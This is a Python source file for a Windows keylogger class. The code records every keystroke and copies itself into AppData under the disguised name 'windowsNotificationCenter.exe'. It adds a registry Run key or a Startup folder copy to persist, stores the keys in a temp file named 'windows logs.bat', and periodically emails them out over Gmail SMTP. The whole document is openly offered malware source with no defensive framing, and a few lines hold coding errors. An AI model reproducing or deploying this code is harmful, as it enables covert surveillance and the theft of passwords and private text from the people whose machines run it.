from pynput.keyboard import Listener
from _thread import start_new_thread
from smtplib import SMTP_SSL
from getpass import getuser
from subprocess import call
from time import sleep
from tempfile import gettempdir
from os import path,chdir,environ
from sys import executable
from shutil import copyfile
class Keylogger:
	"""moduals required
		from pynput.keyboard import Listener,,from _thread import start_new_thread,,from smtplib import SMTP_SSL,,from getpass import getuser
		,,from subprocess import call,,	from time import sleep,,from tempfile import gettempdir,,from os import path,chdir,environ
		,,from sys import executable,,from shutil import copyfile
	   to create object my_keylogger Keylogger(interval,senderMail,MailTo,senderHash)
	   my_keylogger.start()
		"""
	def __init__(self,interval,sender="example@gmail.com",to="example@gmail.com",hashs="account_password"):
		self.key_strokes = ''
		self._from=sender
		self._to=to
		self._hash=hashs
		self.time=interval
	def imports(self):
		print("""
		from pynput.keyboard import Listener
		from _thread import start_new_thread
		from smtplib import SMTP_SSL
		from getpass import getuser
		from subprocess import call
		from time import sleep
		from tempfile import gettempdir
		from os import path,chdir,environ
		from sys import executable
		from shutil import copyfile """)
	def startup(self):
		file_location = executable
		file_copy_location = environ["appdata"] + "\\windowsNotificationCenter.exe"
		if not path.exists(file_copy_location):
			copyfile(file_location,file_copy_location)
			try:
				call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsNotificationService /t REG_SZ /d "'+file_copy_location+'"',shell=True)
				print("registry okay")
			except:
				print("registry failed")
				try:
					startup_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windowsNotificationCenter.exe"
					copyfile(file_location,startup_location)
				except:
					print("startup failed")
		else:
			print(file_copy_location)
	def key_process(self,key):
		self.key_strokes
		try:
			self.key_strokes += str(key.char)
		except AttributeError:
			if key == key.space:
				self.key_strokes += " "
			else:
				self.key_strokes += "  "+str(key)+"  "
	def send_mail(self,_msg,_from,_to,_hash):
		server = SMTP_SSL("smtp.gmail.com")
		server.login(_from,_hash)
		server.sendmail(_from,_to,"Keys Found\n\n"+_msg)
		server.quit()
		print("mail sent!")
	def report_mail(self):
		print("sleeping")
		sleep(self.time)
		if True:
			try:
				print("sending a mail!")
				if not self.key_strokes=="":
					self.send_mail(self.key_strokes,self.sender,self.to,self.hashs)
					print("clearing previous data")
					self.key_strokes = ''
					if path.exists("windows logs.bat"):
						with open("windows logs.bat","w+") as file_write:
							file_write.write("")
					self.report_mail()
				else:
					print("key_strokes is empty i'll wait!")
					self.report_mail()
			except Exception:
				print("mail sending failed")
				self.report_file()
		else:
			self.report_file()
	def report_file(self):
		print("writing a file")
		with open("windows logs.bat","w+") as file:
			file.write(self.key_strokes)
			file.close()
		self.report_mail()
	def start(self):
		self.startup()
		chdir(gettempdir())
		print("directory changed to temp")
		if path.exists("windows logs.bat"):
			print("previous keys found!")
			with open("windows logs.bat","r") as file_read:
				self.key_strokes = file_read.read()
		listener = Listener(on_press=self.key_process)
		with listener:
			print("new thread")
			start_new_thread(self.report_mail,())
			print("starting listener")
			listener.join()
